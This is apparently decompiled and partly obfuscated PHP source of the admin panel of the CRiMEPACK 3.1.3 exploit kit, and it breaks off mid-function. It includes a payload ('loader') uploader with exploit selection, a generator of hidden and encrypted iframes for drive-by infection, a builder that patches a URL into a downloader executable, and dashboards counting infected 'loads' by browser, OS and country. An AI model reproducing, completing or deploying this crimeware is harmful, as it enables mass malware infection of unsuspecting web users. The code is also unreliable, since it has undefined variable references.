<?php


function LoginPage() {
	if (isset( $_SERVER['PHP_AUTH_USER'] )) {
		if ($_SERVER['PHP_AUTH_USER'] == 'crimepack') {
			echo '
			  <html><head><link rel="stylesheet" href="img/style.css"></head><body>

			  <head>
			  <style>
			  body
			  {
			  background-image:url(\'./img/bg.jpg\');
			  background-repeat:repeat;
			  }
			  </style>
			  <meta name="robots" content="nofollow" />
			  <body style="overflow: hidden;" bgcolor="black">
			  <br /><div style="position: absolute; width: 100%; height: 100%;">
			  <center>
			  <img src="img/login.jpg">
			  </center>

			  </div>
			  <div style="position: absolute; width: 100%; height: 100%;"><center>
			  <form action="' . $_SERVER['PHP_SELF'] . '?page=main" method="post">
			  <div style="position: relative; top: 276px; left: -8px;">
			  <input name="login" style="border: 0px solid silver; background-color: transparent; color: gray; width: 114px;" type="text">
			  </div>
			  <div style="position: relative; top: 302px; left: -8px;">
			  <input name="password" type="password" style="border: 0px solid silver; background-color: transparent; color: gray; width: 114px;" type="text">
			  </div>

			  <div style="position: relative; top: 306px; left: 190px;">
			  <input value="" name="submit" style="border: 0px solid gray; background-color: transparent; height: 40px; width: 40px; color: gray;" type="submit"></div>
			  </form>
			  </center>
			  </div>
			  </body>
			  </html>
			  ';
			exit(  );
			return null;
		}

		header( 'HTTP/1.0 401 Unauthorized' );
		echo 'Unauthorized';
		exit(  );
		return null;
	}

	header( 'WWW-Authenticate: Basic realm="User/Pass"' );
	header( 'HTTP/1.0 401 Unauthorized' );
	echo 'Unauthorized';
	exit(  );
}

function GetRate($eaahbcjdfc, $bjeifehihg) {
	$bejbibcabf = 0;

	if (( $bjeifehihg != 0 && $eaahbcjdfc != 0 )) {
		$bejbibcabf = round( substr( $eaahbcjdfc / $bjeifehihg * 100, 0, 5 ) );
	}

	return $bejbibcabf;
}

function ShowSettings() {
	global $cpMySQL;

	ShowHeader(  );
	$cgbddcidhd = array( '', '' );

	if (isset( $_POST['save'] )) {
		$cgbddcidhd[0] = '<br />Failed to upload file!';

		if (is_uploaded_file( $_FILES['file']['tmp_name'] )) {
			move_uploaded_file( $_FILES['file']['tmp_name'], $bgjeghjabe->DataDecrypt( LOADEXE ) );
			$cgbddcidhd[0] = '<br />File uploaded!';
		}
	}
	else {
		if (isset( $_POST['saveall'] )) {
			updateDefined( 'BADTRAFF', BADTRAFF, (isset( $_POST['badtraff'] ) ? $bgjeghjabe->DataEncrypt( '1' ) : $bgjeghjabe->DataEncrypt( '0' )) );
			updateDefined( 'AUTOCHECK', AUTOCHECK, (isset( $_POST['autocheck'] ) ? $bgjeghjabe->DataEncrypt( '1' ) : $bgjeghjabe->DataEncrypt( '0' )) );
			updateDefined( 'REDIRECT', REDIRECT, (isset( $_POST['redirector'] ) ? $bgjeghjabe->DataEncrypt( '1' ) : $bgjeghjabe->DataEncrypt( '0' )) );

			if (isset( $_POST['mydomain'] )) {
				updateDefined( 'DOMAIN', DOMAIN, $bgjeghjabe->DataEncrypt( $_POST['mydomain'] ) );
			}


			if (isset( $_POST['redirdomain'] )) {
				updateDefined( 'REDIRURL', REDIRURL, $bgjeghjabe->DataEncrypt( $_POST['redirdomain'] ) );
			}

			updateDefined( 'EXPLOITS', EXPLOITS, $bgjeghjabe->DataEncrypt( serialize( (isset( $_POST['exploitArray'] ) ? $_POST['exploitArray'] : array(  )) ) ) );
			header( 'Location: ' . basename( $_SERVER['PHP_SELF'] ) . '?page=settings&save=ok' );
			exit(  );
			$cgbddcidhd[1] = 'settings saved!';
		}
		else {
			if (isset( $_POST['adminpass'] )) {
				if (( $_POST['admlogin'] != NULL && $_POST['admpass'] != NULL )) {
					$bffhgbhbag = 'UPDATE `' . $bgjeghjabe->DataDecrypt( MYSQLPREFIX ) . 'users` SET login = \'' . $bgjeghjabe->antisqli( $_POST['admlogin'] ) . '\', password = \'' . md5( $bgjeghjabe->antisqli( $_POST['admpass'] ) ) . '\' WHERE id = \'1\'';

					if (mysql_query( $bffhgbhbag )) {
						echo 'Admin info updated!';
					}
				}
			}
			else {
				if (isset( $_POST['guestpass'] )) {
					if (( $_POST['guestpasswd'] != NULL && $_POST['guestlogin'] != NULL )) {
						$bffhgbhbag = 'UPDATE `' . $bgjeghjabe->DataDecrypt( MYSQLPREFIX ) . 'users` SET login = \'' . $bgjeghjabe->antisqli( $_POST['guestlogin'] ) . '\', password = \'' . md5( $bgjeghjabe->antisqli( $_POST['guestpasswd'] ) ) . '\' WHERE id = \'2\'';

						if (mysql_query( $bffhgbhbag )) {
							echo 'Guest info updated!';
						}
					}
				}
			}
		}
	}

	$cbafaheehc = mysql_query( 'SELECT * FROM `' . $bgjeghjabe->DataDecrypt( MYSQLPREFIX ) . 'users` WHERE `id` = \'1\'' );
	$cjjcbfbecc = mysql_fetch_row( $cbafaheehc );
	$dbhcggjaie = $cjjcbfbecc[1];
	$cbafaheehc = mysql_query( 'SELECT * FROM `' . $bgjeghjabe->DataDecrypt( MYSQLPREFIX ) . 'users` WHERE `id` = \'2\'' );
	$cjjcbfbecc = mysql_fetch_row( $cbafaheehc );
	$bcjjffgdg = $cjjcbfbecc[1];
	echo '
      <table class="tbl2" width="800"><tr>
      <td class="tdtoptable" width="800" align="center"><b>settings</b></td></tr></table>
      <table class="tbl1" width="800"><tr>

      <form method="post" enctype="multipart/form-data">
      <td align="center" class="td1" width="800"><b>admin account</b></td></tr>
      <td align="center" class="tdx1" width="800">
      Login: <input type="text" name="admlogin" value="' . $dbhcggjaie . '" >
      Password: <input type="text" name="admpass" value="" >
      <input type="submit" name="adminpass" value="Update">
      </td>
      </form>

      <form method="post" enctype="multipart/form-data">
      <tr><td align="center" class="td1" width="800"><b>guest account</b></td></tr>
      <td align="center" class="tdx1" width="800">
      Login: <input type="text" name="guestlogin" value="' . $bcjjffgdg . '" >
      Password: <input type="text" name="guestpasswd" value="" >
      <input type="submit" name="guestpass" value="Update"><br />
      </td>
      </form>

      <tr><td align="center" class="td1" width="800"><b>loader file</b></td>
      </tr>
      <td align="center" class="tdx1" width="800">
      <form method="post" enctype="multipart/form-data">
      <input type="file" name="file"">&nbsp;&nbsp;
      <input type="submit" name="save" value="Upload">
      ' . $cgbddcidhd[0] . '
      </form>
      </td>
      <tr>
      <td align="center" class="tdx2" width="800">
      ';

	if (file_exists( $bgjeghjabe->DataDecrypt( LOADEXE ) )) {
		$dfgehfdach = fopen( $bgjeghjabe->DataDecrypt( LOADEXE ), 'rb' );
		$cajdgecjce = fread( $dfgehfdach, 2 );
		fclose( $dfgehfdach );

		if ($cajdgecjce != 'MZ') {
			echo '<font color=red><b>WARNING:</b> Uploaded file is NOT a PE file - This WILL affect your loads.</font>';
		}
		else {
			echo 'current file: ' . filesize( $bgjeghjabe->DataDecrypt( LOADEXE ) ) / 1024 . 'kb (' . filesize( $bgjeghjabe->DataDecrypt( LOADEXE ) ) . ' bytes) md5: ' . md5_file( $bgjeghjabe->DataDecrypt( LOADEXE ) ) . '';
		}
	}
	else {
		echo '<font color=red><b>WARNING: You have no load file uploaded. You _SHOULD_ upload one now!</B></font>';
	}

	echo '</td></tr>
      <tr><td align="center" class="td1" width="800"><b>various settings</b></td>
      </tr>
      <td align="center" class="tdx1" width="800">
      <form method="post" enctype="multipart/form-data">
      <table width="100%">
      <tr><td>
      <input type="checkbox" name="redirector" "' . ($bgjeghjabe->DataDecrypt( REDIRECT ) == 1 ? '"checked=checked"' : '') . '"> redirect non-vulnerable traffic to <input type="text" name="redirdomain" value="' . $bgjeghjabe->DataDecrypt( REDIRURL ) . '"><br />
      </td></tr>
	  <tr><td>
      <input type="checkbox" name="badtraff" "' . ($bgjeghjabe->DataDecrypt( BADTRAFF ) == 1 ? '"checked=checked"' : '') . '"> allow bad traffic (not recommended)
      </td></tr><tr><td>
      <input type="checkbox" name="autocheck" "' . ($bgjeghjabe->DataDecrypt( AUTOCHECK ) == 1 ? '"checked=checked"' : '') . '"> check if domain is blacklisted on login<br /><center>
      domain name<br /><input type="text" name="mydomain" value="' . $bgjeghjabe->DataDecrypt( DOMAIN ) . '"></center>
      </td></tr></table>';
	echo '<tr><td class="td1" align="center" width="800"><b>exploits</b></td></tr>

      <tr><td class="tdx1" align="center" width="800">
      <form method="post" enctype="multipart/form-data">
      <table width="100%">
      <tbody>';
	$deadjchfaf = '';
	$bcdjgcjfaf = unserialize( $bgjeghjabe->DataDecrypt( EXPLOITS ) );
	$cdijcbjhch = array(  );
	$bcijhhcdac = array(  );
	$caegjjeidc = './exploits';

	if (!isset( $cdijcbjhch[$caegjjeidc] )) {
		$cdijcbjhch[$caegjjeidc] = scandir( $caegjjeidc );
	}

	foreach ($cdijcbjhch[$caegjjeidc] as $ebjcjeejg => $fdidcfbad) {
		if (( ( $fdidcfbad != '.' && $fdidcfbad != '..' ) && fnmatch( '*.php', $fdidcfbad ) )) {
			if (file_exists( $caegjjeidc . '/' . str_replace( '.php', '.ini', $fdidcfbad ) )) {
				array_push( $bcijhhcdac, $fdidcfbad );
				continue;
			}

			continue;
		}
	}

	$ebjcjeejg = 0;

	while ($ebjcjeejg < count( $bcijhhcdac )) {
		if (( $bcijhhcdac[$ebjcjeejg] != '.' && $bcijhhcdac[$ebjcjeejg] != '..' )) {
			list( $dgbdjdgjaa ) = explode( '.', $bcijhhcdac[$ebjcjeejg] );
			$bbbehhjcae = parse_ini_file( './exploits/' . $dgbdjdgjaa . '.ini' );

			if ($ebjcjeejg % 2 == 0) {
				$deadjchfaf .= '</tr><tr>';
			}

			$deadjchfaf .= '
<tr><td><input type=\'checkbox\' id=\'' . $bbbehhjcae['name'] . '\' name=\'exploitArray[]\' value=\'' . $dgbdjdgjaa . '\'' . (@in_array( $dgbdjdgjaa, $bcdjgcjfaf ) ? ' checked' : '') . '><label for=\'' . $bbbehhjcae['name'] . '\'>' . $bbbehhjcae['desc'] . '</label></tr></td>
';
		}

		++$ebjcjeejg;
	}

	echo $deadjchfaf . '
      </table>
      <br /><br />
      <input name="saveall" value="Save settings" type="submit">
      ' . (isset( $_GET['save'] ) ? '<br /><br />settings saved!' : '') . '
      </form><br /><br />
      </td></tr></tbody>
      <br />';
}

function ClearStats() {
	global $cpMySQL;

	ShowHeader(  );
	echo '

      <center><form method="post" action="' . $_SERVER['PHP_SELF'] . '?page=confirmed">
      <table class="tbl2" width="800"><tr>
      Please confirm<br /><br /><input type=\'submit\' value=\'&nbsp;Clear stats\'><br /><br />
      </form>';
}

function MakeIFrame() {
	global $cpMySQL;
	global $cpFunctions;

	$deiajgchje = dirname( $_SERVER['PHP_SELF'] );
	$bhaadjaich = $_SERVER['HTTP_HOST'];
	$caegjjeidc = 'http://' . $bhaadjaich . (strlen( $deiajgchje ) <= 1 ? '' : str_replace( '\', '/', $deiajgchje )) . '/';
		$ecijiaihab = $caegjjeidc . 'index.php';
		ShowHeader(  );
		$chibedcgdh = '<iframe name="' . $bdcfhhhfgj->RandLtr( 10, 2 ) . '" src="' . $ecijiaihab . '" marginwidth="1" marginheight="0" title="' . $bdcfhhhfgj->RandLtr( 10, 2 ) . '" border="0" width="1" frameborder="0" height="0" scrolling="no"></iframe>';
		echo '
			<center><b>no crypt</b><br />
			<textarea rows="2" style="width:92%;">' . $chibedcgdh . '</textarea><br />
			<b>crypted</b><br />
			<textarea rows="10" style="width:92%;overflow-y: scroll;"">' . CPackExploitHelper::iframecrypt( substr( $ecijiaihab, 7 ) ) . '</textarea></center><br />';
	}

	function CheckURL() {
		global $cpMySQL;

		ShowHeader(  );
		echo '<script type="text/javascript" src="ajax.js"></script>
      <center>
      <script type="text/javascript" defer>
      function auth () {
      if(document.getElementById(\'url\').value){
            url = document.getElementById(\'url\').value;
            ajax_load(\'CP-ENC-5364.php?URL=\'+url, \'malwarecheck\',\'img/loading.gif\',\'Checking....\');
         }
      }
      </script>
      <form onsubmit=\'auth(); return false;\'>
      <table class="tbl2" width="800"><tr>
      <td class="tdtoptable" width="800" align="center"><b>blacklist checker</b></td></tr></table>
      URL To Check<br /><br /><input type=\'text\' id=\'url\' name=\'url\' value=\'' . $bgjeghjabe->DataDecrypt( DOMAIN ) . '\'><br /><br /><input type=\'submit\' value=\'Check\'><br /><br />
      <div id=\'malwarecheck\'>
      </div>
      </form>';
	}

	function Downloader() {
		ShowHeader(  );
		$cgbddcidhd = '';

		if (isset( $_POST['url'] )) {
			$ecijiaihab = $_POST['url'];

			if (150 < strlen( $ecijiaihab )) {
				$cgbddcidhd = '<br />URL is too long! (Max 150 chars)';
			}
else {
				if (strlen( $ecijiaihab ) < 10) {
					$cgbddcidhd = '<br />URL too short/invalid';
				}
else {
					$fdgbfdfaf = fopen( './dlstub', 'r' );
					$dgchjccaed = fread( $fdgbfdfaf, filesize( './dlstub' ) );
					fclose( $fdgbfdfaf );
					$dgchjccaed = str_replace( '@' . str_repeat( '_', strlen( $ecijiaihab ) ), $ecijiaihab . '!', $dgchjccaed );
					$iccidjhgb = rand( 10000, 99999 );
					$cfaefdjje = 151;
					$jeigbeih = strlen( $ecijiaihab ) + 1;
					$cfaefdjje = $cfaefdjje - $jeigbeih;
					$dgchjccaed = str_replace( str_repeat( '_', $cfaefdjje ), str_repeat( pack( 'H*', '00' ), $cfaefdjje ), $dgchjccaed );
					$dfgehfdach = fopen( './tmp/cpack_dloader_' . $iccidjhgb . '.exe', 'w' );
					fputs( $dfgehfdach, $dgchjccaed );
					fclose( $dfgehfdach );
					$cgbddcidhd = '<br /><a href="./tmp/cpack_dloader_' . $iccidjhgb . '.exe">click here to download</a><br />';
				}
			}
		}

		echo '<center><form method="post" enctype="multipart/form-data"><table class="tbl2" width="800">
      <tr><td class="tdtoptable" width="800" align="center"><b>Downloader builder</b></td></tr></table>
      URL to file <br /><br /><input type=\'text\' id=\'url\' name=\'url\' value=\'\' style=\'width:400px;\'><br /><br /><input type=\'submit\' value=\'Create\'><br />' . $cgbddcidhd . '<br /></form>';
	}

	function ShowHeader() {
		echo '
	   <html><head><title>CRiMEPACK 3.1.3</title><link rel="stylesheet" href="img/style.css"></head><body>
      <table class="main" align="center">
      <tr>
      <td width="800" valign="top">
      <center><img src=img/logo.png><br /><br />
      <table class="tbl2" width="100%" height="20"><tr>
      <td class="menutable" width="100%" height="20" align="center">
      <b><a href=' . $_SERVER['PHP_SELF'] . '?page=main>MAiN</a>
      <img src=./img/dot.png> <a href=javascript:window.location.reload(false);>REFRESH</a>
      <img src=./img/dot.png> <a href=?page=referrers>REFERRERS</a>
      <img src=./img/dot.png> <a href=?page=countries>COUNTRiES</a>
      <img src=./img/dot.png> <a href=?page=checkurl>BLACKLiST CHECK</a>
      <img src=./img/dot.png> <a href=?page=makedownloader>DOWNLOADER</a>
      <img src=./img/dot.png> <a href=?page=makeiframe>iFRAME</a>';

		if (!$_SESSION['guest']) {
			echo '<img src=./img/dot.png> <a href=?page=clear>CLEAR STATS</a> <img src=./img/dot.png> <a href=?page=settings>SETTiNGS</a>';
		}
else {
			echo '<img src=./img/dot.png> <a href=javascript:alert(\'access%20denied\');>CLEAR STATS</a> <img src=./img/dot.png> <a href=javascript:alert(\'access%20denied\');>SETTINGS</a>';
		}

		echo ' <img src=./img/dot.png> <a href=?page=logout>LOGOUT</a></b>
      </td></tr></table>
      <br />
      </center>
      ';
	}

	function ShowStats($ddjajgefcc) {
		global $pid;
		global $cpMySQL;

		$dfjcieffbg = array( 'segadora1' => array(  ), 'crimepack' => array(  ), 'browsers' => array(  ), 'os' => array(  ), 'referrers' => array(  ), 'countries' => array(  ), 'extra' => array(  ) );
		$bffhgbhbag = 'SELECT * FROM `' . $bgjeghjabe->DataDecrypt( MYSQLPREFIX ) . 'peeps`';
		$jdcideceh = mysql_query( $bffhgbhbag );

		while ($djibjdaeef = mysql_fetch_array( $jdcideceh )) {
			if (empty( $djibjdaeef['country'] )) {
				$djibjdaeef['country'] = 'Unknown';
			}


			if (!empty( $djibjdaeef['sploit'] )) {
				if (isset( $dfjcieffbg['crimepack']['loads'] )) {
					++$dfjcieffbg['crimepack']['loads'];
				}
else {
					$dfjcieffbg['crimepack']['loads'] = 1;
				}


				if (isset( $dfjcieffbg['crimepack']['loads_' . $djibjdaeef['browser']] )) {
					++$dfjcieffbg['crimepack']['loads_' . $djibjdaeef['browser']];
				}
else {
					$dfjcieffbg['crimepack']['loads_' . $djibjdaeef['browser']] = 1;
				}


				if (isset( $dfjcieffbg['crimepack']['loads_' . $djibjdaeef['os']] )) {
					++$dfjcieffbg['crimepack']['loads_' . $djibjdaeef['os']];
				}
else {
					$dfjcieffbg['crimepack']['loads_' . $djibjdaeef['os']] = 1;
				}


				if (!empty( $djibjdaeef['sploit'] )) {
					if (isset( $dfjcieffbg['crimepack']['load_' . $djibjdaeef['sploit']] )) {
						++$dfjcieffbg['crimepack']['load_' . $djibjdaeef['sploit']];
					}
else {
						$dfjcieffbg['crimepack']['load_' . $djibjdaeef['sploit']] = 1;
					}
				}


				if (!empty( $djibjdaeef['extra'] )) {
					if (isset( $dfjcieffbg['crimepack']['extra'][$djibjdaeef['extra']] )) {
						++$dfjcieffbg['crimepack']['extra'][$djibjdaeef['extra']];
					}
else {
						$dfjcieffbg['crimepack']['extra'][$djibjdaeef['extra']] = 1;
					}
				}


				if (!isset( $dfjcieffbg['countries'][$djibjdaeef['country']]['loads'] )) {
					$dfjcieffbg['countries'][$djibjdaeef['country']]['loads'] = 1;
				}
else {
					++$dfjcieffbg['countries'][$djibjdaeef['country']]['loads'];
				}


				if (( !isset( $dfjcieffbg['referrers'][$djibjdaeef['referer']]['loads'] ) && 1 < strlen( $djibjdaeef['referer'] ) )) {
					$dfjcieffbg['referrers'][$djibjdaeef['referer']]['loads'] = 1;
				}
else {
					if (1 < strlen( $djibjdaeef['referer'] )) {
						++$dfjcieffbg['referrers'][$djibjdaeef['referer']]['loads'];
					}
				}
			}


			if (isset( $dfjcieffbg['browsers'][$djibjdaeef['browser']] )) {
				++$dfjcieffbg['browsers'][$djibjdaeef['browser']];
			}
else {
				$dfjcieffbg['browsers'][$djibjdaeef['browser']] = 1;
			}


			if (isset( $dfjcieffbg['os'][$djibjdaeef['os']] )) {
				++$dfjcieffbg['os'][$djibjdaeef['os']];
			}
else {
				$dfjcieffbg['os'][$djibjdaeef['os']] = 1;
			}


			if (isset( $dfjcieffbg['crimepack']['hits'] )) {
				++$dfjcieffbg['crimepack']['hits'];
			}
else {
				$dfjcieffbg['crimepack']['hits'] = 1;
			}


			if (!isset( $dfjcieffbg['countries'][$djibjdaeef['country']]['hits'] )) {
				$dfjcieffbg['segadora1'][$djibjdaeef['country']] = 1;
				$dfjcieffbg['countries'][$djibjdaeef['country']]['hits'] = 1;
			}
else {
				++$dfjcieffbg['segadora1'][$djibjdaeef['country']];
				++$dfjcieffbg['countries'][$djibjdaeef['country']]['hits'];
			}


			if (( !isset( $dfjcieffbg['referrers'][$djibjdaeef['referer']]['hits'] ) && 1 < strlen( $djibjdaeef['referer'] ) )) {
				$dfjcieffbg['referrers'][$djibjdaeef['referer']]['hits'] = 1;
			}
else {
				if (1 < strlen( $djibjdaeef['referer'] )) {
					++$dfjcieffbg['referrers'][$djibjdaeef['referer']]['hits'];
				}
			}

			arsort( $dfjcieffbg['segadora1'] );
			arsort( $dfjcieffbg['referrers'] );
		}

		ShowHeader(  );
		switch ($ddjajgefcc) {
			case 'all': {
				echo '
      <table class="tbl2" width="800"><tr>
      <td class="tdtoptable" width="800" align="center"><b>overall stats</b></td></tr></table>
      <center>
      <table class="tbl1" width="800"><tr class="columns">
      <td align="center" width="150" class="td1"><b>unique hits</b></td>
      <td align="center" width="150" class="td1"><b>loads</b></td>
      <td align="center" width="150" class="td1"><b>exploit rate</b></td>
      </tr>
      <td align="center" class="tdx1" width="80">' . (isset( $dfjcieffbg['crimepack']['hits'] ) ? $dfjcieffbg['crimepack']['hits'] : '0') . '</td>
      <td align="center" class="tdx1" width="80">' . (isset( $dfjcieffbg['crimepack']['loads'] ) ? $dfjcieffbg['crimepack']['loads'] : '0') . '</td>
      <td align="center" class="tdx1" width="80">' . (isset( $dfjcieffbg['crimepack']['loads'] ) ? GetRate( $dfjcieffbg['crimepack']['loads'], $dfjcieffbg['crimepack']['hits'] ) : '0') . '%</td>
      </table>
      </center>';
				$cgaggcbdeg = array( 'iepeers', 'msiemc', 'pdf', 'mdac', 'hcp', 'java', 'webstart', 'java-getval', 'activex', 'other', 'aggressive' );
				echo '
      <table class="tbl2" width="800"><tr>
      <td class="tdtoptable" width="800" align="center"><b>exploit stats</b></td></tr></table>
      <table class="tbl1" width="800"><tr>
      ';
				foreach ($cgaggcbdeg as $fceibiegg) {
					echo '
      <td align="center" class="td1" width="150"><b>' . $fceibiegg . '</b></td>';
				}

				echo '
      </tr>
      ';
				foreach ($cgaggcbdeg as $fceibiegg) {
					echo '<td align="center" class="tdx1" width="80">' . (isset( $dfjcieffbg['crimepack']['load_' . $fceibiegg] ) ? $dfjcieffbg['crimepack']['load_' . $fceibiegg] : '0') . '</td>';
				}

				echo '
      </table>
      ';

				if ($bgjeghjabe->DataDecrypt( BADTRAFF )) {
					$cgaggcbdeg = array( '2k', '2k3', 'xp', 'vista', 'seven' );
				}
else {
					$cgaggcbdeg = array( '2k', '2k3', 'xp', 'vista' );
				}

				echo '
      <table class="tbl2" width="800"><tr>
      <td class="tdtoptable" width="800" align="center"><b>os stats</b></td></tr></table>
      <table class="tbl1" width="800">
      <tr>
      <td align="center" class="td1" width="200"><b>os</b></td>
      <td align="center" class="td1" width="100"><b>hits</b></td>
      <td align="center" class="td1" width="70"><b>loads</b></td>
      <td align="center" class="td1" width="70"><b>rate</b></td>
      </tr>
      ';
				$ebjcjeejg = 0;
				foreach ($cgaggcbdeg as $fceibiegg) {
					++$ebjcjeejg;
					$cbaddghhdf = ($ebjcjeejg % 2 == 0 ? '1' : '2');
					echo '
      <tr>
      <td align="center" class="tdx' . $cbaddghhdf . '" width="150"><b>windows ' . $fceibiegg . '</b></td>
      <td align="center" class="tdx' . $cbaddghhdf . '" width="80">' . (isset( $dfjcieffbg['os'][$fceibiegg] ) ? $dfjcieffbg['os'][$fceibiegg] : '0') . '</td>
      <td align="center" class="tdx' . $cbaddghhdf . '" width="80">' . (isset( $dfjcieffbg['crimepack']['loads_' . $fceibiegg] ) ? $dfjcieffbg['crimepack']['loads_' . $fceibiegg] : '0') . '</td>
      <td align="center" class="tdx' . $cbaddghhdf . '" width="80">' . (isset( $dfjcieffbg['crimepack']['loads_' . $fceibiegg] ) ? GetRate( $dfjcieffbg['crimepack']['loads_' . $fceibiegg], $dfjcieffbg['os'][$fceibiegg] ) : '0') . '%</td>
      </tr>';
				}

				echo '
      </table>';
				echo '
      <table class="tbl2" width="800"><tr><td class="tdtoptable" width="800" align="center"><b>browser stats</b></td></tr></table>
      <table class="tbl1" width="800">
      <tr>
      <td align="center" class="td1" width="15%" height="32"><img src=img/1.png width="30" height="30"></td>
      <td align="center" class="td1" width="15%" height="32"><img src=img/2.png width="30" height="30"></td>
      <td align="center" class="td1" width="15%" height="32"><img src=img/3.png width="30" height="30"></td>';

				if ($bgjeghjabe->DataDecrypt( BADTRAFF )) {
					echo ' <td align="center" class="td1" width="15%" height="32"><img src=img/4.png width="30" height="30"></td>';
				}

				echo '
      </tr><tr>
      <td align="center" class="tdx1" width="300"><b>' . (isset( $dfjcieffbg['browsers']['ie'] ) ? $dfjcieffbg['browsers']['ie'] : '0') . '</b> (<b>' . (isset( $dfjcieffbg['crimepack']['loads_ie'] ) ? $dfjcieffbg['crimepack']['loads_ie'] : '0') . '</b> loads) ' . (isset( $dfjcieffbg['crimepack']['loads_ie'] ) ? GetRate( $dfjcieffbg['crimepack']['loads_ie'], (isset( $dfjcieffbg['browsers']['ie'] ) ? $dfjcieffbg['browsers']['ie'] : '0') ) : 0) . '%</td>
      <td align="center" class="tdx1" width="300"><b>' . (isset( $dfjcieffbg['browsers']['ff'] ) ? $dfjcieffbg['browsers']['ff'] : '0') . '</b> (<b>' . (isset( $dfjcieffbg['crimepack']['loads_ff'] ) ? $dfjcieffbg['crimepack']['loads_ff'] : '0') . '</b> loads) ' . (isset( $dfjcieffbg['crimepack']['loads_ff'] ) ? GetRate( $dfjcieffbg['crimepack']['loads_ff'], (isset( $dfjcieffbg['browsers']['ff'] ) ? $dfjcieffbg['browsers']['ff'] : '0') ) : 0) . '%</td>
      <td align="center" class="tdx1" width="300"><b>' . (isset( $dfjcieffbg['browsers']['op'] ) ? $dfjcieffbg['browsers']['op'] : '0') . '</b> (<b>' . (isset( $dfjcieffbg['crimepack']['loads_op'] ) ? $dfjcieffbg['crimepack']['loads_op'] : '0') . '</b> loads) ' . (isset( $dfjcieffbg['crimepack']['loads_op'] ) ? GetRate( $dfjcieffbg['crimepack']['loads_op'], (isset( $dfjcieffbg['browsers']['op'] ) ? $dfjcieffbg['browsers']['op'] : '0') ) : 0) . '%</td>';

				if ($bgjeghjabe->DataDecrypt( BADTRAFF )) {
					echo '<td align="center" class="tdx1" width="300"><b>' . (isset( $dfjcieffbg['browsers']['ch'] ) ? $dfjcieffbg['browsers']['ch'] : '0') . '</b> (<b>' . (isset( $dfjcieffbg['crimepack']['loads_ch'] ) ? $dfjcieffbg['crimepack']['loads_ch'] : '0') . '</b> loads) ' . (isset( $dfjcieffbg['crimepack']['loads_ch'] ) ? GetRate( $dfjcieffbg['crimepack']['loads_ch'], (isset( $dfjcieffbg['browsers']['ch'] ) ? $dfjcieffbg['browsers']['ch'] : '0') ) : 0) . '%</td>';
				}

				echo '
      </tr></table>';

				if (0 < count( $dfjcieffbg['segadora1'] )) {
					echo '<table class="tbl2" width="800"><tr>
         <td class="tdtoptable" width="800" align="center"><b>top countries</b></td></tr></table>
         <table class="tbl1" width="800">
         <tr>
         <td align="center" class="td1" width="20"></td>
         <td align="center" class="td1" width="200"><b>country</b></td>
         <td align="center" class="td1" width="100"><b>hits</b></td>
         <td align="center" class="td1" width="70"><b>loads</b></td>
         <td align="center" class="td1" width="70"><b>rate</b></td>
         </tr>';
					$ebjcjeejg = 0;
					foreach ($dfjcieffbg['segadora1'] as $dfafcfbfff => $bcgijcjeci) {
						$bcgijcjeci = $dfjcieffbg['countries'][$dfafcfbfff];
						++$ebjcjeejg;
						$cbaddghhdf = ($ebjcjeejg % 2 == 0 ? '1' : '2');
						echo '<tr>
            <td align="center" class="tdx' . $cbaddghhdf . '" width="20"><img src="showflag.php?country=' . strtolower( $dfafcfbfff ) . '" border=0 height=10></td>
            <td align="center" class="tdx' . $cbaddghhdf . '" width="200">' . CPGeoIP::getcountrynamebyshort( $dfafcfbfff ) . '</td>
            <td align="center" class="tdx' . $cbaddghhdf . '" width="100">' . $bcgijcjeci['hits'] . '</td>
            <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? $bcgijcjeci['loads'] : 0) . '</td>
            <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? GetRate( $bcgijcjeci['loads'], $bcgijcjeci['hits'] ) : 0) . '%</td>
            </tr>';

						if ($ebjcjeejg == 10) {
							break;
						}
					}

					echo '</table>';
				}

				break;
			}

			case 'countries': {
				if (0 < count( $dfjcieffbg['countries'] )) {
					echo '<table class="tbl2" width="800"><tr>
               <td class="tdtoptable" width="800" align="center"><b>countries</b></td></tr></table>
               <table class="tbl1" width="800">
               <tr>
               <td align="center" class="td1" width="20"></td>
               <td align="center" class="td1" width="200"><b>country</b></td>
               <td align="center" class="td1" width="100"><b>hits</b></td>
               <td align="center" class="td1" width="70"><b>loads</b></td>
               <td align="center" class="td1" width="70"><b>rate</b></td>
               </tr>';
					$ebjcjeejg = 0;
					foreach ($dfjcieffbg['countries'] as $dfafcfbfff => $bcgijcjeci) {
						++$ebjcjeejg;
						$cbaddghhdf = ($ebjcjeejg % 2 == 0 ? '1' : '2');
						echo '<tr>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="20"><img src="showflag.php?country=' . strtolower( $dfafcfbfff ) . '" border=0 height=10></td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="200">' . CPGeoIP::getcountrynamebyshort( $dfafcfbfff ) . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="100">' . $bcgijcjeci['hits'] . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? $bcgijcjeci['loads'] : 0) . '</td>
                  <td align="center" class="tdx' . $cbaddghhdf . '" width="70">' . (isset( $bcgijcjeci['loads'] ) ? GetRate( $bcgijcjeci['loads'], $bcgijcjeci['hits'] ) : 0) . '%</td>
                  </tr>';
					}

					echo '</table>';
				}
else {
					echo '<table class="tbl2" width="800"><tr>
                     <td class="tdtoptable" width="800" align="center"><b>countries</b></td></tr></table>
                     <table class="tbl1" width="800">
                     <tr>
                     <td align="center" class="td1" width="20"></td>
                     <td align="center" class="td1" width="200"><b>country</b></td>
                     <td align="center" class="td1" width="100"><b>hits</b></td>
                     <td align="center" class="td1" width="70"><b>loads</b></td>
                     <td align="center" class="td1" width="70"><b>rate</b></td>
                     </tr>
                     <tr>
                     <td align="center" class="tdx1" width="20">N/A</td>
                     <td align="center" class="tdx1" width="200">N/A</td>
                     <td align="center" class="tdx1" width="100">N/A</td>
                     <td align="center" class="tdx1" width="70">N/A</td>
                     <td align="center" class="tdx1" width="70">N/A</td>
                     </tr></table>';
				}

				break;
			}

			case 'advstats': {
